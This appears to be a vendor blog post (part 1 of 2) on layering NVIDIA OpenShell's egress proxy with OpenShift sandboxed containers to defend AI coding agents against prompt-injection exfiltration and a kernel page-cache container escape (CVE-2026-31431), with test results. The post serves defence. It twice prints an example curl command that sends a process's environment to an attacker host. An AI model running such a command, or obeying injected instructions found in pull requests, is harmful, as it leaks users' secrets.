*Part 1 of 2. [Part 2: Real-world attacks meeting real sandboxes](LINK_TO_PART_2) walks through what happened when we tested these defences with live exploits on Red Hat OpenShift.*

To do their job, AI coding agents need to run shell commands, read and write files, and make network calls. That's the same capability profile as a compromised workload, and no single sandbox technology covers the full threat surface. [Red Hat OpenShift sandboxed containers](https://docs.redhat.com/en/documentation/openshift_sandboxed_containers) and [NVIDIA OpenShell](https://github.com/NVIDIA/OpenShell) each address a different part of the problem. Together, they significantly reduce the attack surface that either one leaves open on its own.

The security challenges aren't new. Data exfiltration, privilege escalation, and container escape have been concerns since organizations started running untrusted code in shared environments. What's changed is the attack surface. An AI agent that processes untrusted input (a pull request, a git patch, an issue comment) can be manipulated into carrying out those attacks without any human deciding to do so. The agent becomes the vector.

Two recent incidents make the point. In June 2026, Microsoft published research showing how prompt injections hidden in GitHub pull requests could hijack continuous integration/continuous delivery (CI/CD) agents into leaking secrets. Separately, a kernel vulnerability ([CVE-2026-31431](https://nvd.nist.gov/vuln/detail/CVE-2026-31431)) surfaced that allows any unprivileged process to corrupt shared page cache. It's a 732-byte Python script, 100% reliable, with no race conditions. It's now on the [Cybersecurity and Infrastructure Security Agency (CISA) Known Exploited Vulnerabilities catalog](https://www.cisa.gov/known-exploited-vulnerabilities-catalog). Both were disclosed in 2026. Both are directly relevant to anyone running agents in containers.

No single sandbox technology handles both of these threat classes.

## OpenShell: The exoskeleton protecting your agents, and more importantly, your secrets

[NVIDIA OpenShell](https://github.com/NVIDIA/OpenShell) is a relatively young project, still evolving rapidly, but its approach to the problem is worth understanding. It wraps each agent in a policy-enforced sandbox at the application layer. Its core mechanism is a network egress proxy that sits between the agent process and the outside world. Every outbound connection (HTTP, HTTPS, raw TCP) routes through this proxy, which evaluates the destination, port, calling binary, and optionally the HTTP method and path. The default posture is deny-all.

In practice, you write a policy that allowlists exactly the endpoints your agent needs. For an AI coding agent backed by a local inference server, that might be a single entry: the model API endpoint on port 8000. Everything else is denied.

If a prompt injection tricks the agent into running `curl http://attacker-controlled-host/exfil -d "$(cat /proc/self/environ)"`, the proxy intercepts the connection attempt and returns policy_denied. In our testing, the secrets didn't leave the sandbox.

OpenShell also enforces filesystem isolation through Linux Landlock, restricting which paths the agent can read and write. The agent runs as an unprivileged user with dropped capabilities. These mechanisms are aimed at application-layer threats: data exfiltration, unauthorized API calls, credential leakage through network channels. If an attacker's goal is to get data out of the sandbox over the network, this is the kind of defence that can stop them.

But there's a category of attack it can't address. Landlock, seccomp, and the network proxy all operate within the kernel's own integrity boundary. They rely on the kernel being trustworthy. If an attacker finds a bug that lets them corrupt kernel memory directly, say a page-cache write primitive that bypasses all file permission checks, then every userspace security mechanism built on top of that kernel becomes irrelevant. This includes OpenShell itself: its proxy and supervisor share the same kernel and page cache as the workload, so a kernel-level attack could potentially corrupt the enforcement mechanism, not just bypass it.

## OpenShift Sandboxed Container (Kata containers): kernel isolation that protects the host from the workload

OpenShift sandboxed containers, based on [Kata Containers](https://github.com/kata-containers/kata-containers), starts from a different premise. Instead of enforcing policy within a shared kernel, it removes the shared kernel from the equation entirely. Each pod gets its own kernel inside a lightweight virtual machine.

The isolation boundary isn't a Linux namespace or a seccomp filter. It's the CPU's hardware virtualization extensions (VT-x on Intel, AMD-V on AMD), enforced by the hypervisor. A kernel exploit inside the container affects the guest kernel, not the host.

This matters for page-cache attacks specifically. Under the standard container runtime (runc with overlayfs), the page cache is shared with the host kernel. Corrupting a file's page cache inside one container makes that corruption visible to every other container sharing the same image layer. That's a container escape.

Under OpenShift sandboxed containers, the container filesystem uses virtiofs (a FUSE-based filesystem) with its own page cache. The exploit's splice-based primitive targets the kernel's page-cache path, but the virtiofs architecture means the corruption either stays isolated within the VM or doesn't occur at all. The host kernel and its page cache are never touched.

But OpenShift sandboxed containers doesn't inspect what the workload does at the application layer. It doesn't filter network traffic or enforce egress policies. It doesn't care whether the process inside the VM is calling the model API or posting secrets to an attacker-controlled server. From its perspective, `curl http://attacker-controlled-host/exfil` is a perfectly normal network operation. The packets leave the VM, traverse the pod network, and reach their destination without interference.

## The gap neither closes alone

Here's the problem laid out plainly:

| Threat                              | OpenShell        | OpenShift sandboxed containers |
|-------------------------------------|------------------|-------------------------------|
| Data exfiltration via HTTP          | Mitigates        | No coverage                   |
| Prompt injection leading to exfil   | Mitigates        | No coverage                   |
| Kernel exploit / container escape   | No coverage      | Mitigates                     |
| Cross-container page-cache corruption | No coverage    | Mitigates                     |

OpenShell is designed to handle threats above the kernel. OpenShift sandboxed containers is designed to handle threats at and below the kernel. Each leaves a gap that falls squarely in the other's coverage area.

For a traditional web application, you might accept one of these gaps. A well-patched, tightly-configured container runtime with network policies might be enough. But AI coding agents change the calculus in two specific ways.

They process untrusted input as a core part of their job. Reviewing a pull request, applying a patch, and reading an issue description are normal agent tasks. Every one of them is a prompt injection surface. The application-layer risk isn't hypothetical; it's inherent to the workflow.

They also routinely run arbitrary commands: pip install, npm install, make, cargo build, arbitrary shell scripts. Agents run these as part of their normal operation. Any of these could trigger a kernel vulnerability. The kernel attack surface isn't behind a privilege boundary; it's directly exposed to the agent's everyday work.

Running an agent with only one protection layer leaves a gap that a motivated attacker, or an unlucky dependency, can exploit.

## Dual protection: Covering more ground on OpenShift

Running OpenShell inside an OpenShift sandboxed containers VM gives you both layers simultaneously.

The agent process sits inside an OpenShell sandbox, which enforces application-layer policy: egress filtering, filesystem isolation, process restrictions. That sandbox runs inside a Kata micro-VM, which provides a dedicated guest kernel isolated from the host by hardware virtualization.

In our testing, an application-layer attack (prompt injection leading to data exfiltration) hit OpenShell's egress proxy and was denied. A kernel-level attack (CVE-2026-31431 targeting shared page cache) hit the VM boundary, and the exploit failed to corrupt the page cache at all. The host and other containers weren't affected.

Neither layer interferes with the other. OpenShell doesn't need to know it's running inside a VM. OpenShift sandboxed containers doesn't need to know that the workload has an application-layer proxy. They compose cleanly because they operate at different levels of the stack.

On Red Hat OpenShift, the pieces are available to start building this kind of layered defence. [OpenShift sandboxed containers](https://docs.redhat.com/en/documentation/openshift_sandboxed_containers) is a supported operator in OperatorHub. OpenShell, while still an early-stage project, deploys via Helm chart and is actively being developed for Kubernetes environments. A pod gets dual protection by specifying the kata RuntimeClass and running inside an OpenShell sandbox. The same container image, the same agent configuration, the same model endpoint.

## What happens when you test it

Theory is one thing. We wanted to see it break.

We set up 3 identically configured pods on OpenShift 4.21, each running the same AI coding agent backed by the same inference endpoint. One pod had only OpenShift sandboxed containers (Kata VM, no OpenShell). One had only OpenShell (application-layer policy, no VM). One had both.

We ran 2 attacks against all 3 pods. For the first, we executed the exfiltration command directly inside each pod, bypassing the LLM entirely. This is a harder test: we're not asking whether the model's guardrails will save you, we're assuming they won't and showing that OpenShell caught the data leak anyway. For the second, we ran a live exploit of CVE-2026-31431 that corrupts a file's page cache and proves whether the corruption escapes to other containers on the same node. When OpenShell blocked the exfiltration attempt, the proxy returned policy_denied. When the exploit ran against an unprotected container on overlayfs, a verification pod on the same node read PWN!CT from the corrupted marker file.

The results:

| Attack                         | Kata only        | OpenShell only   | Both             |
|--------------------------------|------------------|------------------|------------------|
| Prompt injection exfiltration  | DATA LEAKED      | BLOCKED          | BLOCKED          |
| CVE-2026-31431 container escape| BLOCKED          | HOST COMPROMISED | BLOCKED          |

Each attack succeeded against the pod missing its corresponding protection. Only the dual-protected pod stopped both.

This is what defence in-depth looks like in practice: not redundant layers doing the same thing, but complementary layers covering each other's blind spots. No combination of tools guarantees complete protection, but running only one layer leaves a gap that's straightforward to exploit.

In [Part 2](LINK_TO_PART_2), we walk through exactly how each attack works, why each defence stops (or fails to stop) it, and how we proved the results. If you want to see the exploit output, the policy denial messages, and the verification methodology, that's where to go.

Ready to try this yourself? Explore [OpenShift sandboxed containers](https://docs.redhat.com/en/documentation/openshift_sandboxed_containers) and [NVIDIA OpenShell](https://github.com/NVIDIA/OpenShell) for your own AI agent workloads.
